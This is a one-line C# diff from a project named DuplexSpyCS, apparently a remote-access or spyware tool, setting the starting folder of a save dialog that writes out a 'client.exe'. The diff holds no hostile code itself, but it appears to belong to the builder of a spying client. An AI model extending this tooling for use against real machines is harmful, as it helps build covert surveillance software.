@@ -558,6 +558,7 @@ namespace DuplexSpyCS
             SaveFileDialog sfd = new SaveFileDialog();
             sfd.FileName = "client.exe";
             sfd.Filter = "Executable File(*.exe)|*.exe";
+            sfd.InitialDirectory = Path.GetDirectoryName(Application.StartupPath);
             if (sfd.ShowDialog() == DialogResult.OK)
             {
                 try
